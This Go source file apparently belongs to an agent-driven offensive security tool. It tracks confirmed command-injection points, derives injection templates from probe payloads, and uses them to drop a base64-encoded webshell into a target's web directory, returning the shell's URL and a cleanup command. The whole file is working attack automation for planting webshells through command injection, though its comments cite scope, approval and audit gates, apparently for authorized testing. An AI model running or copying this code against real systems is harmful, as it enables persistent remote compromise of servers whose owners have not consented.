package server

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/url"
	"path"
	"strings"
	"sync"

	capkit "github.com/c1ayooo/capkit/core"
	"github.com/c1ayooo/capkit/kits/shellkit"

	"github.com/c1ayooo/4zrec/internal/capkitbridge"
)

// injectionPoint is a command-injection point that has been *proven* to work in
// this process. webshell_deploy needs one to write the payload, but its own
// input carries only a URL — the parameter, location and working payload
// template live here, recorded from the probe/execute call that confirmed them.
type injectionPoint struct {
	URL      string            `json:"url"`
	Method   string            `json:"method,omitempty"`
	Headers  map[string]string `json:"headers,omitempty"`
	Body     string            `json:"body,omitempty"`
	Param    string            `json:"param,omitempty"`
	Location string            `json:"location,omitempty"`
	Value    string            `json:"value,omitempty"`
	Proxy    string            `json:"proxy,omitempty"`
	// Template is the confirmed payload with {{cmd}} where the command goes,
	// e.g. {{value}};{{cmd}}. An empty template means "not usable for delivery".
	Template string `json:"-"`
}

// confirmedPoints remembers proven injection points for the process lifetime.
// It is deliberately in-memory: a point that cannot be re-proven is not a point
// we should write to, and the confirmation cost is one probe call.
type confirmedPoints struct {
	mu sync.RWMutex
	m  map[string]injectionPoint
}

func newConfirmedPoints() *confirmedPoints {
	return &confirmedPoints{m: map[string]injectionPoint{}}
}

// pointKey normalizes a point URL so the probe's `{{inject}}`-marked URL and the
// plain URL the deploy tool receives resolve to the same entry.
func pointKey(raw string) string {
	raw = strings.TrimSpace(raw)
	raw = strings.ReplaceAll(raw, "{{inject}}", "")
	u, err := url.Parse(raw)
	if err != nil {
		return strings.ToLower(raw)
	}
	u.Scheme = strings.ToLower(u.Scheme)
	u.Host = strings.ToLower(u.Host)
	u.Fragment = ""
	return u.String()
}

func (p *confirmedPoints) record(pt injectionPoint) {
	if pt.Template == "" || pt.URL == "" {
		return
	}
	p.mu.Lock()
	defer p.mu.Unlock()
	p.m[pointKey(pt.URL)] = pt
}

func (p *confirmedPoints) lookup(raw string) (injectionPoint, bool) {
	p.mu.RLock()
	defer p.mu.RUnlock()
	pt, ok := p.m[pointKey(raw)]
	return pt, ok
}

// observeCapkitResult records a point as soon as a probe or execute call proves
// it. Recording from the probe matters: an agent that confirms and then deploys
// should not have to run a throwaway command first.
func (s *Server) observeCapkitResult(_ context.Context, tool string, input json.RawMessage, res capkit.Result) {
	if s.capkitPoints == nil || !res.OK {
		return
	}
	var in struct {
		Point    injectionPoint `json:"point"`
		Template string         `json:"template"`
	}
	if err := json.Unmarshal(input, &in); err != nil || in.Point.URL == "" {
		return
	}
	switch tool {
	case "cmdi_execute":
		in.Point.Template = strings.TrimSpace(in.Template)
		s.capkitPoints.record(in.Point)
	case "cmdi_probe":
		// The probe proves execution with a marker payload (e.g. ";printf X"),
		// not with a command slot. Only a confirmed finding with a payload is
		// usable, and the separator is what generalizes — the marker itself must
		// not be reused as {{cmd}}.
		for _, f := range res.Findings {
			if f.Confirmed && f.Payload != "" {
				in.Point.Template = deriveCmdTemplate(f.Payload)
				s.capkitPoints.record(in.Point)
				break
			}
		}
	}
}

// deriveCmdTemplate turns a confirmed probe payload into a {{cmd}} template.
// A payload already carrying {{cmd}} is used as-is.
func deriveCmdTemplate(found string) string {
	found = strings.TrimSpace(found)
	if found == "" {
		return ""
	}
	if strings.Contains(found, "{{cmd}}") {
		return found
	}
	rest := strings.TrimPrefix(found, "{{value}}")
	if rest == found {
		// The payload did not use the {{value}} slot; there is no separator to
		// generalize from safely.
		return ""
	}
	if strings.HasPrefix(rest, "%0a") {
		return "{{value}}%0a{{cmd}}"
	}
	var sep strings.Builder
	for _, r := range rest {
		if r == ';' || r == '|' || r == '&' || r == ' ' {
			sep.WriteRune(r)
			continue
		}
		break
	}
	if s := strings.TrimSpace(sep.String()); s != "" {
		return "{{value}}" + s + "{{cmd}}"
	}
	return "{{value}};{{cmd}}"
}

// capkitDeployer is the host delivery channel shellkit asks for. It writes the
// payload through an already-confirmed injection point by reusing cmdi_execute
// (rather than opening its own HTTP path), so the write goes through the same
// scope/approval/rate/audit gates and leaves the same evidence as any other
// command.
type capkitDeployer struct {
	points *confirmedPoints
	// bridge is set right after the runtime is built; the deployer is passed
	// into that construction, so the field cannot be filled earlier.
	bridge *capkitbridge.Bridge
	// call is a test seam; nil means "use the bridge".
	call func(ctx context.Context, tool string, input json.RawMessage, cc capkit.CallContext) (capkit.Result, error)
}

func (d *capkitDeployer) invoke(ctx context.Context, tool string, input json.RawMessage, cc capkit.CallContext) (capkit.Result, error) {
	if d.call != nil {
		return d.call(ctx, tool, input, cc)
	}
	if d.bridge == nil {
		return capkit.Result{}, fmt.Errorf("投递通道未就绪")
	}
	return d.bridge.Call(ctx, tool, input, cc)
}

func (d *capkitDeployer) Drop(ctx context.Context, req shellkit.WebShellDrop) (*shellkit.WebShellDropResult, error) {
	pt, ok := d.points.lookup(req.TargetURL)
	if !ok {
		return nil, fmt.Errorf("目标 %s 没有已确认的注入点：先对该点跑 cmdi_probe 确认，再用 cmdi_execute 验证命令回显，之后才能投递", req.TargetURL)
	}
	dir := strings.TrimSpace(req.Dir)
	if dir == "" {
		return nil, fmt.Errorf("dir 必填：投递需要一个目标可写的落盘目录（如 /var/www/html）")
	}
	if strings.TrimSpace(req.Filename) == "" {
		return nil, fmt.Errorf("载荷文件名为空")
	}
	remote := strings.TrimRight(dir, "/") + "/" + req.Filename

	// base64 keeps the payload out of the shell's quoting rules entirely: the
	// wire form contains only [A-Za-z0-9+/=], so no byte of the shell can break
	// out of the command. The payload itself is never logged.
	encoded := base64.StdEncoding.EncodeToString(req.Content)
	cmd := "printf %s " + shellQuote(encoded) + " | base64 -d > " + shellQuote(remote)

	call, err := json.Marshal(map[string]any{
		"point":    pointPayload(pt),
		"template": pt.Template,
		"command":  cmd,
	})
	if err != nil {
		return nil, err
	}
	cc, _ := capkit.CallContextFrom(ctx)
	res, err := d.invoke(ctx, "cmdi_execute", call, cc)
	if err != nil {
		return nil, fmt.Errorf("经注入点写入失败: %w", err)
	}
	if !res.OK {
		// The envelope's summary names the failure without echoing the payload.
		return nil, fmt.Errorf("经注入点写入失败: %s", res.Summary)
	}

	return &shellkit.WebShellDropResult{
		// The vulnerable script sits in the directory the dropped file lands in
		// for the common case (webroot == dir). When it does not, session_open
		// fails visibly rather than silently — the URL is reported, not guessed
		// silently.
		FileURL: dropFileURL(req.TargetURL, req.Filename),
		Cleanup: "rm -f " + shellQuote(remote),
	}, nil
}

// pointPayload rebuilds the inject_point object cmdi_execute expects.
func pointPayload(pt injectionPoint) map[string]any {
	out := map[string]any{"url": pt.URL}
	if pt.Method != "" {
		out["method"] = pt.Method
	}
	if pt.Param != "" {
		out["param"] = pt.Param
	}
	if pt.Location != "" {
		out["location"] = pt.Location
	}
	if pt.Value != "" {
		out["value"] = pt.Value
	}
	if pt.Body != "" {
		out["body"] = pt.Body
	}
	if pt.Proxy != "" {
		out["proxy"] = pt.Proxy
	}
	if len(pt.Headers) > 0 {
		out["headers"] = pt.Headers
	}
	return out
}

// dropFileURL derives where the dropped file is served from, given the URL of
// the script that wrote it.
func dropFileURL(targetURL, filename string) string {
	u, err := url.Parse(strings.ReplaceAll(strings.TrimSpace(targetURL), "{{inject}}", ""))
	if err != nil || u.Host == "" {
		return filename
	}
	base := path.Dir(u.Path)
	if base == "." {
		base = "/"
	}
	if !strings.HasSuffix(base, "/") {
		base += "/"
	}
	u.Path = base + filename
	u.RawQuery = ""
	u.Fragment = ""
	return u.String()
}

var _ shellkit.WebShellDeployer = (*capkitDeployer)(nil)
